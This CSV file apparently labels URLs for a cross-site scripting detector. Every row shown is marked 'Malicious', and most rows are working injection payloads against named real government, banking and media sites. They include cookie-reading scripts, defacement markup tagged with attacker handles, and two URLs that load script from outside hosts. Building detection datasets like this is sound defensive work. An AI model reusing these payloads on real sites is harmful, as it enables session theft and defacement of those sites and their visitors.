Sentence,Type
http://www.nkth.gov.hu/main.php?folderid=772&amp;iid=100&amp;ctag=search&amp;newsearch=true&amp;simplesearch=true&amp;se<br>arch=%22%3e%3cscript%3ealert%281%29%3c%2fscript%3e%3c%2ftextarea%3e%3cscript%3ealert%28%22kaksii_was<br>_here%22%29%3cscript%3ealert%28%27kaksii_was_here%27%29%3balert%281%29%3c%2fscript%3e%22%3c%2fhtml%3<br>e%3chtml%3e%3cscript%3ealert%2810111%29%3c%2fscript%3e%3cdiv%2520align%3dcenter%3e%2520%3cfont%2520s<br>ize%3d4%3e%3ctextarea%2520name%3d1%2520cols%3d100000%2520rows%3d10000%2520id%3d1%3ekaksii%2520was%25<br>20here%3c%2ftextarea%3e%3c%2ffont%3e%3c%2fdiv%3e%3cnoscript%3e%3cplaintext%3e&amp;c_searchbox_submit=ok2<br>fdiv%3e%3cnoscript%3e%3cplaintext%3e&amp;c_searchbox_submit=ok,Malicious
http://www.okm.gov.hu/main.php?folderid=3&amp;iid=100&amp;ctag=search&amp;newsearch=true&amp;simplesearch=true&amp;searc<br>h=%22%3e%3cscript%3ealert%281%29%3c%2fscript%3e%3c%2ftextarea%3e%3cscript%3ealert%28%22kaksii_was_he<br>re%22%29%3cscript%3ealert%28%27kaksii_was_here%27%29%3balert%281%29%3c%2fscript%3e%22%3c%2fhtml%3e%3<br>chtml%3e%3cscript%3ealert%2810111%29%3c%2fscript%3e%3cdiv%2520align%3dcenter%3e%2520%3cfont%2520size<br>%3d4%3e%3ctextarea%2520name%3d1%2520cols%3d100000%2520rows%3d10000%2520id%3d1%3ekaksii%2520was%2520h<br>ere%3c%2ftextarea%3e%3c%2ffont%3e%3c%2fdiv%3e%3cnoscript%3e%3cplaintext%3e&amp;c_searchbox_submit=ok,Malicious
http://vam.gov.hu/searchdoc.do?searchstring=%22%3e%3cscript%3ealert%281%29%3c%2fscript%3e%3c%2ftexta<br>rea%3e%3cscript%3ealert%28%22kaksii_was_here%22%29%3cscript%3ealert%28%27kaksii_was_here%27%29%3bale<br>rt%281%29%3c%2fscript%3e%22%3c%2fhtml%3e%3chtml%3e%3cscript%3ealert%2810111%29%3c%2fscript%3e%3cdiv%<br>2520align%3dcenter%3e%2520%3cfont%2520size%3d4%3e%3ctextarea%2520name%3d1%2520cols%3d100000%2520rows<br>%3d10000%2520id%3d1%3ekaksii%2520was%2520here%3c%2ftextarea%3e%3c%2ffont%3e%3c%2fdiv%3e%3cnoscript%3<br>e%3cplaintext%3e&amp;search=ok,Malicious
http://kpi.gov.hu/index.php?wg_node=websearch&amp;wgsearch_text=%22%3e%3cscript%3ealert%281%29%3c%2fscri<br>pt%3e%3c%2ftextarea%3e%3cscript%3ealert%28%22kaksii_was_here%22%29%3cscript%3ealert%28%27kaksii_was_<br>here%27%29%3balert%281%29%3c%2fscript%3e%22%3c%2fhtml%3e%3chtml%3e%3cscript%3ealert%2810111%29%3c%2f<br>script%3e%3cdiv%2520align%3dcenter%3e%2520%3cfont%2520size%3d4%3e%3ctextarea%2520name%3d1%2520cols%3<br>d100000%2520rows%3d10000%2520id%3d1%3ekaksii%2520was%2520here%3c%2ftextarea%3e%3c%2ffont%3e%3c%2fdiv<br>%3e%3cnoscript%3e%3cplaintext%3e&amp;wg_fusk4=keres,Malicious
http://mfa.gov.hu/kum2005/templates/search.aspx?nrmode=published&amp;nroriginalurl=%2fkum%2fhu%2fbal%2fs<br>earch%3fb%3d1&amp;nrnodeguid=%7b6a7b8b97-9e10-42db-a303-1a87dd500507%7d&amp;nrcachehint=nomodifyguest&amp;kereso<br>='%22%3e%3cscript%3ealert(1)%3c&amp;b=1,Malicious
http://ssd.jpl.nasa.gov/sbdb.cgi?-----------------------------31360752327591\r\ncontent-disposition:<br>%20form-data;name=%22sstr%22\r\n\r\n%22%3e%3cscript%3ealert(1)%3c/script%3e%3c/textarea%3e%3ch\r\n--<br>---------------------------31360752327591--\r\n,Malicious
http://eol.jsc.nasa.gov/scripts/search/websearch.pl?word=%3cmarquee%3e%3ch1%3ekaksii%20was%20here%3c<br>/h1%3e%3c/marquee%3e%3cdiv%20align=center%3e%20%3cfont%20size=4%3e%3ctextarea%20name=1%20cols=100%20<br>rows=1000%20id=1%3ekaksii%20was%20here%3c/textarea%3e%3c/font%3e%3c/div%3e%3cnoscript%3e%3cplaintext<br>%3e,Malicious
http://sousuo.mofcom.gov.cn/query/englishquerysearch.jsp?pageno=&amp;p_keyword=%22%3e%3cscript%3ealert%2<br>81%29%3c%2fscript%3e%3c%2ftextarea%3e%3cscript%3ealert%28%22kaksii_was_here%22%29%3cscript%3ealert%2<br>8%27kaksii_was_here%27%29%3balert%281%29%3c%2fscript%3e%22%3c%2fhtml%3e%3chtml%3e%3cscript%3ealert%2<br>810111%29%3c%2fscript%3e%3cdiv%2520align%3dcenter%3e%2520%3cfont%2520size%3d4%3e%3ctextarea%2520name<br>%3d1%2520cols%3d1000%2520rows%3d1000%2520id%3d1%3ekaksii%2520was%2520here%3c%2ftextarea%3e%3c%2ffont<br>%3e%3c%2fdiv%3e%3cnoscript%3e%3cplaintext%3e,Malicious
http://www.sdpc.gov.cn/search/searchresultnew.jsp?searchword1=%22%3e%3cscript%3ealert%281%29%3c%2fsc<br>ript%3e%3c%2ftextarea%3e%3cscript%3ealert%28%22kaksii_was_here%22%29%3cscript%3ealert%28%27kaksii_wa<br>s_here%27%29%3balert%281%29%3c%2fscript%3e%22%3c%2fhtml%3e%3chtml%3e%3cscript%3ealert%2810111%29%3c%<br>2fscript%3e%3cdiv%2520align%3dcenter%3e%2520%3cfont%2520size%3d4%3e%3ctextarea%2520name%3d1%2520cols<br>%3d1000%2520rows%3d1000%2520id%3d1%3ekaksii%2520was%2520here%3c%2ftextarea%3e%3c%2ffont%3e%3c%2fdiv%<br>3e%3cnoscript%3e%3cplaintext%3e&amp;submit122=++%b2%e9+%d1%af&amp;searchword=%22%3e%3cscript%3ealert%a3%a81%<br>a3%a9%3c%2fscript%3e%3c%2ftextarea%3e%3cscript%3ealert%a3%a8%22kaksii_was_here%22%a3%a9%3cscript%3ea<br>lert%a3%a8%27kaksii_was_here%27%a3%a9%3balert%a3%a81%a3%a9%3c%2fscript%3e%22%3c%2fhtml%3e%3chtml%3e%<br>3cscript%3ealert%a3%a810111%a3%a9%3c%2fscript%3e%3cdiv%2520align%3dcenter%3e%2520%3cfont%2520size%3d<br>4%3e%3ctextarea%2520name%3d1%2520cols%3d1000%2520rows%3d1000%2520id%3d1%3ekaksii%2520was%2520here%3c<br>%2ftextarea%3e%3c%2ffont%3e%3c%2fdiv%3e%3cnoscript%3e%3cplaintext%3e&amp;channelid=75009&amp;prechannelid=,Malicious
http://app.sgdi.gov.sg/search.asp?t_keyword='%22%3e%3cscript%20src=http://ckers.org/s%3e&amp;mode=quick&amp;<br>t_option=any&amp;rec=10&amp;last=0&amp;total=0,Malicious
http://appweblogic.most.gov.cn/was40/search?prepage=10&amp;channelid=44374&amp;sortfield=-docreltime&amp;strkeyw<br>ords=&amp;itime=0&amp;searchword=%22%3e%3cscript%3ealert%281%29%3c%2fscript%3e%3c%2ftextarea%3e%3cscript%3ea<br>lert%28%22kaksii_was_here%22%29%3cscript%3ealert%28%27kaksii_was_here%27%29%3balert%281%29%3c%2fscri<br>pt%3e%22%3c%2fhtml%3e%3chtml%3e%3cscript%3ealert%2810111%29%3c%2fscript%3e%3cdiv%2520align%3dcenter%<br>3e%2520%3cfont%2520size%3d4%3e%3ctextarea%2520name%3d1%2520cols%3d1000%2520rows%3d1000%2520id%3d1%3e<br>kaksii%2520was%2520here%3c%2ftextarea%3e%3c%2ffont%3e%3c%2fdiv%3e%3cnoscript%3e%3cplaintext%3e&amp;submi<br>t.x=9&amp;submit.y=9&amp;sltsearch=0,Malicious
http://interview.aqsiq.gov.cn:8080/was40/search?templet=demo_result.jsp&amp;searchword=%22%3e%3cscript%3<br>ealert%281%29%3c%2fscript%3e%3c%2ftextarea%3e%3cscript%3ealert%28%22kaksii_was_here%22%29%3cscript%3<br>ealert%28%27kaksii_was_here%27%29%3balert%281%29%3c%2fscript%3e%22%3c%2fhtml%3e%3chtml%3e%3cscript%3<br>ealert%2810111%29%3c%2fscript%3e%3cdiv%2520align%3dcenter%3e%2520%3cfont%2520size%3d4%3e%3ctextarea%<br>2520name%3d1%2520cols%3d1000%2520rows%3d1000%2520id%3d1%3ekaksii%2520was%2520here%3c%2ftextarea%3e%3<br>c%2ffont%3e%3c%2fdiv%3e%3cnoscript%3e%3cplaintext%3e&amp;channelid=40734,Malicious
http://www.myvideo.de/?unique_form%5b9508997c%5d=9508997c&amp;challenge=af7282d8831c722adaaae39366dc772a<br>&amp;response=&amp;mv_login_box=login_user_inline&amp;action=%2f%2f--%3e%3c%2fscript%3e%22%3e%27%3e%3cscript%3ea<br>lert%28string.fromcharcode%2888%2c83%2c83%29%29%3c%2fscript%3e%3d%26%7b%7d&amp;function=mv_video_box&amp;log<br>in_username=&amp;login_password=&amp;login_save=yes&amp;submit=login,Malicious
http://www.immobilienscout24.de/registration/loginregistrationdialog.go;jsessionid=135d2904c3324541d<br>d15f6ea16961a9b.worker2?_s_pepos=simbaform,Malicious
"http://www.live365.com/cgi-bin/directory.cgi?searchdesc=&quot;&lt;/script&gt;&quot;&gt;'&gt;&lt;script&gt;alert(string.fromcharc<br>ode(88,83,83))&lt;/script&gt;&lt;&amp;i1=",Malicious
"http://www.faz.net/in/intemplates/faznet/default.asp?suchzeitraum=3&amp;tpl=&lt;/script&gt;&quot;&gt;'&gt;&lt;script&gt;alert(s<br>tring.fromcharcode(88,83,83))&lt;/script&gt;&amp;term= suche&amp;go=",Malicious
"http://www.stern.de/community/newsletter/?id=&quot;&lt;/script&gt;&quot;&gt;'&gt;&lt;script&gt;alert(string.fromcharcode(88,83,8<br>3))&lt;/script&gt;&lt;br&amp;actioncode=insert&amp;selectnewsletters=257&amp;toaddress=",Malicious
http://www.comdirect.de/t/t?page=%3cscript%20src=%22http://v.m5t.de/j.js%22/%3e,Malicious
http://lokales.suche.web.de/ym/poi/poi.aspx?sessionguid=26a1b4ac-34e8-4cc7-b4b4-72494f55ac15&amp;qt=11&amp;v<br>iew=5,Malicious
http://www.lufthansa.com/online/portal/!ut/p/kcxml/04_sj9spykssy0xplmnmz0vm0y_qjzkln4g3cjcxamlb2eb--<br>phooo5iqt76vh75uan6afofuaer5y6kigdnbbch/delta/base64xml/l0ldu0lkq1rpn29na21du1ntu1nrl29ob1fbqulrz2pg<br>sufbuwhdrulrakdfsnpoqknks1ehlzrkrmldbzbladfpy29uuvzhagqtc0lum2k5vtnzusehlzdfmf8xtecylzkyodu3mc9zys5m<br>b3jnb3r0zw5qyxnzd29yza!!?pc_7_0_1lg2_command=forgottenpassword#7_0_1lg2,Malicious
"http://www.live365.com/cgi-bin/directory.cgi?site=&quot; width=0<br>height=0&gt;&lt;script&gt;alert(string.fromcharcode(88,83,83))&lt;/script&gt;&lt;img<br>src=&quot;/scp&amp;searchdesc=ddd&amp;searchgenre=presets",Malicious
http://www.griffonbank.com/deu/support/search/?action=index&amp;text=%27%3e%3cscript%3ealert%28string.fr<br>omcharcode%2888%2c83%2c83%29%29%3c%2fscript%3e%3cimg+&amp;x=30&amp;y=7&amp;url=,Malicious
https://www.hsbc.fi.cr/hsbcenlinea/a/generales/error.asp?num=1&amp;txt=%3cscript%3ealert%28string.fromch<br>arcode%2888%2c83%2c83%29%29%3c%2fscript%3e,Malicious
"http://derstandard.at/?url=%3c/script%3e%3cscript%3ealert(string.fromcharcode(88,83,83))%3c/script%3<br>e%3cscript%3e",Malicious
"http://www.marvel.com/digitalcomics/?dc_search=&quot;;&lt;script&gt;alert(string.fromcharcode(88,83,83))&lt;/scrip<br>t&gt;&lt;img src=&quot;&quot; alt=&quot;",Malicious
"http://www1.conrad.de/scripts/wgate/zcop_b2c/?~template=pcat_area_s_browse&amp;mfhelp=&amp;p_selected_area=%<br>24root&amp;p_selected_area_fh=&amp;perform_special_action=&amp;glb_user_js=y&amp;shop=b2c&amp;vgl_artikel_in_index=&amp;prod<br>uct_show_id=&amp;p_page_to_display=%22;/%3e%3cscript%3ealert(string.fromcharcode(88,83,83))%3c/script%3e<br>%3cmeta&amp;~cookies=1&amp;zhmmh_lfo=&amp;zhmmh_area_kz=&amp;s_haupt_kategorie=&amp;p_searchstring=&amp;p_searchstring_artnr<br>=&amp;p_search_category=alle&amp;r3_matn=&amp;insert_kz=&amp;gvlon=&amp;area_s_url=&amp;brand=&amp;amount=&amp;new_item_quantity=&amp;ar<br>ea_url=&amp;direkt_aufriss_area=&amp;p_countdown=&amp;p_80=&amp;p_80_category=&amp;p_80_article=&amp;p_next_template_after_l<br>ogin=&amp;mindestbestellwert=&amp;login=&amp;password=&amp;bpemail=&amp;bpid=&amp;url=&amp;show_wk=&amp;use_search=3&amp;p_back_template<br>=&amp;template=&amp;kat_save=&amp;updatestr=&amp;vgl_artikel_in_vgl=&amp;titel=&amp;darsteller=&amp;regisseur=&amp;anbieter=&amp;genre=&amp;<br>fsk=&amp;jahr=&amp;jahr2=&amp;dvd_error=x&amp;dvd_empty_error=x&amp;dvd_year_error=&amp;call_dvd=&amp;kna_news=&amp;p_status_scenari<br>o=&amp;documentselector=&amp;aktiv=&amp;p_load_area=$root&amp;p_artikelbilder_mode=&amp;p_sortopt=&amp;page=&amp;p_catalog_max_r<br>esults=20",Malicious
"http://auto-verkaufen.mobile.de/fsbo/contact-form.html?subject=%22%3e%3cscript%3ealert(string.fromch<br>arcode(88,83,83))%3c/script%3e%3cimg%20src=%22%22%20alt=%22",Malicious
"http://www.bankprivat.com/suche.php?q=&quot;&gt;&lt;script&gt;alert(string.fromcharcode(88,83,83))&lt;/script&gt;&lt;img<br>src=&quot;&quot; alt=&quot;&amp;submit=&amp;s=0&amp;e=10&amp;user_e=10",Malicious
"http://www.msnbc.com/pfp/choices.asp?section=\'%3e%3cscript%3ealert(string.fromcharcode(88,83,83))%3<br>c/script%3e%3cimg%20src=%22%22%20alt=\'",Malicious
https://www.icq.com/password/error.php?email=&quot;&gt;&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;script&gt;alert(document.cookie)&lt;/scrip<br>t&gt;&amp;err=108,Malicious
http://music.cooltoad.com/music/song.php?id=%3cscript%3ealert(/123/)%3c/script%3e,Malicious
http://jobs.skype.com/applyfor.html?position=1%3cscript%3ealert(document .cookie);%3c/script%3e,Malicious
http://www.visa.com.ru/?id=130&amp;txt1=%3cscript%3ealert('the_miller')%3c/script%3e&amp;x=&amp;y=,Malicious
http://depositfiles.com/ru/switch_lang.php?return_url=%22%3e%3cscript%3ealert <br>(document.cookie)%3c/script%3e,Malicious
http://www.zimbio.com/pilot?zurl=%2ftattoo%2bgalleries%2farticles%2f93%2fanyone%2bheard%2bof%2bchopp<br>er%2btattoo&amp;url=javascript:alert(%27the_miller%27),Malicious
http://health.rambler.ru/drugs/pharmacy.html?phid=37&quot;&gt;&lt;script&gt;alert('the_miller')&lt;/script&gt;,Malicious
http://www.50webs.com/signup/?&amp;plan=0&amp;domain_type=existing&amp;epp=undefined&amp;dperiod=undefined&amp;domain=%2<br>2%3e%3cscript%3ealert()%3c/script%3e,Malicious
http://www.net-security.org/books.php?cat=1%22%3e%3cscript%3ealert('the_miller')%3c/script%3e&amp;url=ht<br>tp://vital.h.com.ua,Malicious
http://horoscopes.rambler.ru/sonnik.html?sec=59199&quot;&gt;&lt;script&gt;alert('the_miller')&lt;/script&gt;,Malicious
http://sub.rambler.ru/catalog/rambler/news/?login=&quot;&gt;&lt;script&gt;alert('the_miller')&lt;/script&gt;,Malicious
http://www.epson.ru/search.asp?qu=&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.1tv.ru/owa/win/ort5_shed.shed?p_shed_title_id=136210&amp;p_date=&quot;&gt;&lt;script&gt;alert(&quot;the_miller&quot;)<br>&lt;/script&gt;&amp;inzone=0,Malicious
http://maps.yandex.ru/search-o.xml?text=%22%3e%3cscript%3ealert(/the_miller/)%3c%2fscript%3e%22%3e%3<br>cscript%3e%3cb%3epidaraz%3 c%2fb%3e%3c%2fscript%3e%22%3e%3cscript%3e%3cb%3epi <br>daraz%3c%2fb%3e%3c%2fscript%3e&amp;mapid=900&amp;mapx=6234549&amp;mapy=7279344&amp;scale=3&amp;slices=&amp;distance=&amp;traffic<br>=&amp;g=1.objects.20.10.&amp;g=1.streets.20.200.&amp;how=houses&amp;asc=1,Malicious
http://mail.gawab.com/trywebmail3.html?username='%3e%3cscript%3ealert(document.cookie)%3c/script%3e&amp;<br>domain='%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://index.online.ua/?q=&quot;&gt;&lt;script&gt;alert('the_miller')&lt;/script&gt;&amp;type=1,Malicious
http://invest.bnpparibas.com/en/glossary/default-print.asp?letter=%22%3e%3cscript%3ealert('by%20enco<br>re')%3c/script%3e,Malicious
http://maps2.nris.mt.gov/topofinder1/searchtool.asp?letter=%22%3e%3cscript%3ealert('by%20encore')%3c<br>/script%3e,Malicious
http://chealth.canoe.ca/browse_alphabetically.asp?search_letter=%22%3e%3cscript%3ealert(%22by%20enco<br>re%20!%22)%3c/script%3e,Malicious
http://sante.canoe.com/browse_alphabetically.asp?search_letter=%22%3e%3cscript%3ealert(%22by%20encor<br>e%20!%22)%3c/script%3e,Malicious
http://aol.mediresource.com/browse_alphabetically.asp?search_letter=%22%3e%3cscript%3ealert(%22by%20<br>encore%20!%22)%3c/script%3e,Malicious
http://buyersguide.eweek.com/company/listcompaniesbysite.asp?getlistby=%22%3e%3cscript%3ealert(%22by<br>%20encore%20!%22)%3c/script%3e,Malicious
http://www.worth1000.com/galleries.asp?list=%22%3e%3cscript%3ealert(%22by%20encore%20!%22)%3c/script<br>%3e,Malicious
http://ame.cami.jccbi.gov/search.asp?search=%22%3e%3cscript%3ealert('by%20encore')%3c/script%3e,Malicious
http://www.eib.europa.eu/search/index.asp?style=%22%3e%3cscript%3ealert('by%20encore')%3c/script%3e,Malicious
http://www.dotcr.ost.dot.gov/asp/redirect.asp?url=%22%3e%3cscript%3ealert('by%20encore')%3c/script%3<br>e,Malicious
http://www.nationalgallery.co.uk/shop/search.asp?sitelanguage=%22%3e%3cscript%3ealert('by%20encore')<br>%3c/script%3e,Malicious
http://www.rff.fr/pages/autre/glossaire_detail.asp?lettre=%22%3e%3cscript%3ealert('by%20encore')%3c/<br>script%3e,Malicious
http://www.iph.fgov.be/keywords.asp?zoekstringkeywords=%22%3e%3cscript%3ealert('by%20encore')%3c/scr<br>ipt%3e,Malicious
http://www.state.pa.us/papower/search/search.asp?qu=%22%3e%3cscript%3ealert('by%20encore')%3c/script<br>%3e,Malicious
http://zpravy.idnes.cz/kdo-ma-platit-u-lekare-vladni-politici-se-prou-fah-/domaci.asp?c=%22%3e%3cscr<br>ipt%3ealert('by%20encore')%3c/script%3e,Malicious
http://www.verizonwirelessarena.com/email.asp?url=%22%3e%3cscript%3ealert('by%20encore')%3c/script%3<br>e,Malicious
http://cep.lse.ac.uk/pubs/author.asp?author=%22%3e%3cscript%3ealert('by%20encore')%3c/script%3e,Malicious
http://bodyandhealth.canada.com/browse_alphabetically.asp?search_letter=%22%3e%3cscript%3ealert('by%<br>20encore')%3c/script%3e%3cmarquee%3e%3ch1%3eby%20encore%3c/h1%3e%3ch1%3eby%20encore%3c/h1%3e%3ch1%3e<br>by%20encore%3c/h1%3e%3ch1%3eby%20encore%3c/h1%3e%3c/marquee%3e,Malicious
http://cf.uol.com.br/cante/new/musicas.asp?a=2&amp;b=%22%3e%3cbody+onload=alert(%22by%20encore%22)%3e%3c<br>marquee%3e%3ch1%3eby%20encore%3c/h1%3e,Malicious
http://www.eera.gov.uk/atoz.asp?letter=%22%3e%3cbody+onload=alert(%22by%20encore%22)%3e%3cmarquee%3e<br>%3ch1%3eby%20encore%3c/h1%3e,Malicious
http://www.physics.uiuc.edu/people/index.asp?q=b&amp;t=%22%3e%3cscript%3ealert('by%20encore')%3c/script%<br>3e,Malicious
http://www.biblioteket.stockholm.se/default.asp?id=2817&amp;extras=a*%2fkl&amp;subjectarea=%22%3e%3cbody+onl<br>oad=alert(%22by%20encore%22)%3e%3cmarquee%3e%3ch1%3eunutamadim%20:(%20%20%20%3c/h1%3e%3ch2%3e%20by%2<br>0encore%20%3c/h2%3e,Malicious
http://www.mot.gov.kh/tourist_attraction_detail.asp?cat=phnom%20sam%20bok%20resort&amp;pro=%22%3e%3cbody<br>+onload=alert(%22by%20encore%22)%3e%3cmarquee%3e%3ch1%3eunutamadim%20:(%20%20%20%3c/h1%3e%3ch2%3e%20<br>by%20encore%20%3c/h2%3e,Malicious
http://www.fairfaxcounty.gov/rim/incomedetail.asp?inctyp=%22%3e%3cbody+onload=alert(%22by%20encore%2<br>2)%3e%3cmarquee%3e%3ch1%3eunutamadim%20:(%20%20%20%3c/h1%3e%3ch2%3e%20by%20encore%20%3c/h2%3e,Malicious
http://www.defencejobs.gov.au/default.asp?initmedia=1&amp;media=flash&amp;bounceback=%3e%22%3e%3cscript%20%0<br>a%0d%3ealert('noph0bia')%3b%3c/script%3e,Malicious
http://www.dcmnr.gov.ie/search/search.htm?st=%3c%2fscript%3e%3cscript%3ealert%28%22noph0bia%22%29%3c<br>%2fscript%3e,Malicious
http://www.mvr.gov.mk/desktopdefault.aspx?tabindex=0&amp;tabid=47&amp;search=%3e%22%3e%3cscript%20%0a%0d%3ea<br>lert(document.domain)%3b%3c/script%3e,Malicious
http://www.mkeh.gov.hu/kereses?keywords=%3e%22%3e%3cscript%20%0a%0d%3ealert(document.domain)%3b%3c/s<br>cript%3e,Malicious
http://www.fonden.gob.ve/busqueda/index.php?search_field=%3e%22%3e%3cscript%20%0a%0d%3ealert(documen<br>t.domain)%3b%3c/script%3e&amp;submit=buscar,Malicious
http://www.proinversion.gob.pe/0/0/modulos/jer/buscador.aspx?are=0&amp;pfl=0&amp;jer=-1&amp;txtbusqueda=%3e%22%3<br>e%3cscript%20%0a%0d%3ealert(document.domain)%3b%3c/script%3e,Malicious
http://www.guerrero.gob.mx/?p=%3e%22%3e%3cscript%20%0a%0d%3ealert(document.domain)%3b%3c/script%3e&amp;a<br>rtorder=readart&amp;article=1040,Malicious
http://www.fomentodeportivo.gob.mx/buscar.php?busquedatexto=%3e%22%3e%3cscript%20%0a%0d%3ealert(docu<br>ment.domain)%3b%3c/script%3e&amp;seleccion=noticias&amp;submit=buscar,Malicious
http://www.ieepo.gob.mx/dbase.htm?num=6&amp;keys=%3e%22%3e%3cscript%20%0a%0d%3ealert(document.domain)%3b<br>%3c/script%3e&amp;x=0&amp;y=0,Malicious
http://www.inde.gob.pa/default.asp?id=%3e%22%3e%3cscript%20%0a%0d%3ealert(document.domain)%3b%3c/scr<br>ipt%3e,Malicious
http://www.peru.gob.pe/frame.asp?dsc_url_web=javascript:alert(1),Malicious
http://www.kcskspip.gov.pl/harmonogram/index/pl?grupa=%3e%22%3e%3cscript%20%0a%0d%3ealert(document.d<br>omain)%3b%3c/script%3e,Malicious
http://www.paa.gov.pl/?frame=%3e%22%3e%3cscript%20%0a%0d%3ealert(document.domain)%3b%3c/script%3e,Malicious
http://www.polskapomoc.gov.pl/index.php?query=%3e%22%3e%3cscript%20%0a%0d%3ealert(document.domain)%3<br>b%3c/script%3e&amp;length=10&amp;document=38,Malicious
http://abkhazia.gov.ge/ganc/tavmjdomare.php?lang=%22%3e%3cscript%3ealert(/noph0bia/)%3c/script%3e,Malicious
http://www.pog.gov.ge/ge/adv_search.php?q=%22%3e%3cscript%3ealert(/noph0bia/)%3c/script%3e&amp;x=0&amp;y=0,Malicious
http://www.uta.gov.ge/search.php?dosearch=yes&amp;story=%22%3e%3cscript%3ealert(/noph0bia/)%3c/script%3e<br>&amp;search.x=0&amp;search.y=0&amp;search=go,Malicious
http://www.mod.gov.ge/?l=g&amp;id=%22%3e%3cscript%3ealert(/noph0bia/)%3c/script%3e,Malicious
http://www.dpa.gov.ge/index.php?lan=%3e%22%3e%3cscript%20%0a%0d%3ealert(document.domain)%3b%3c/scrip<br>t%3e,Malicious
http://www.e.gov.qa/egovportal/visaservice/visaservicedetails.jsp?serviceportal=%3c%2fscript%3e%3csc<br>ript%3ealert%28%22noph0bia%22%29%3c%2fscript%3e,Malicious
http://www.english.education.gov.qa/content/general/search?keywords=%3c%2fscript%3e%3cscript%3ealert<br>%28%22noph0bia%22%29%3c%2fscript%3e&amp;x=0&amp;y=0,Malicious
http://www.sec.gov.qa/content/general/search?keywords=%3c%2fscript%3e%3cscript%3ealert%28%22noph0bia<br>%22%29%3c%2fscript%3e&amp;x=0&amp;y=0,Malicious
http://www.qnpm.gov.qa/english/search.asp?query=%22%3e%3cscript%3ealert(/noph0bia/)%3c/script%3e&amp;x=0<br>&amp;y=0,Malicious
http://www.ictqatar.gov.qa/output/page221.asp?pageid=%22%3e%3cscript%3ealert(/noph0bia/)%3c/script%3<br>e,Malicious
http://www.epichal.gov.gr/c/portal_public/layout?p_l_id=1.1&amp;p_p_id=latest_news&amp;p_p_action=1&amp;p_p_stat<br>e=%22%3e%3cscript%3ealert(document.domain)%3c/script%3e&amp;p_p_mode=view&amp;_latest_news_struts_action=%2f<br>ext%2fmy%2fnews%2fview_new&amp;_latest_news_struts_action=%2fext%2fmy%2fnews%2fview_news&amp;_latest_news_ne<br>w_id=554&amp;_latest_news_p_p_text=news,Malicious
http://www.veth.gov.gr/c/portal_public/layout?p_l_id=1.1&amp;p_p_id=latest_news&amp;p_p_action=1&amp;p_p_state=m<br>aximized&amp;p_p_mode=%22%3e%3cscript%3ealert(document.domain)%3c/script%3e&amp;_latest_news_struts_action=%<br>2fext%2fmy%2fnews%2fview_new&amp;_latest_news_struts_action=%2fext%2fmy%2fnews%2fview_news&amp;_latest_news_<br>new_id=400&amp;_latest_news_p_p_text=news,Malicious
http://www.jussanjuan.gov.ar/corzoogle.php?q=%22%3e%3c/script%3e%3cscript%3ealert%28document.cookie%<br>29%3c/script%3e,Malicious
http://www.e-esperanza.gov.ar/not1.php?n_id=%3c/script%3e%3cscript%3ealert%28document.cookie%29%3c/s<br>cript%3e,Malicious
http://www.osmgp.gov.ar/symposium2011/index.php?content=%3c/script%3e%3cscript%3ealert%28document.co<br>okie%29%3c/script%3e,Malicious
http://www.montehermoso.gov.ar/lonkotech/ver_pagina.php?id_pagina=%22%3e%3cscript%3ealert%28/ar3sw0r<br>med/%29;%3c/script%3e,Malicious
http://www.ibr.gov.ar/prueba/ibr/publicaciones/publicacionesanuales.php?anio=%3c/script%3e%3cscript%<br>3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.legistdf.gov.ar/lp/presidencia/index.php?dir=%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29;%3<br>c/script%3e,Malicious
http://www.turismo.tandil.gov.ar/paginas/listado.php?categoriaid=%22%3c/script%3e%3cscript%3ealert%2<br>8document.cookie%29%3c/script%3e,Malicious
http://subonline.subdere.gov.cl/presentacion/comuna.php?id=%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29<br>;%3c/script%3e,Malicious
http://www.aviacioncivilsalta.gov.ar/verpersonal-en.php?id=0&amp;amp;m=%22%3e%3cscript%3ealert%28/ar3sw0<br>rmed/%29;%3c/script%3e,Malicious
http://www.senasa.gov.ar/seccion_ressr.php?in=%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29;%3c/script%3<br>e&amp;titulo=,Malicious
http://www.pnd.gov.ar/web/amplia_not.php?not=%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29; <br>%3c/script%3e,Malicious
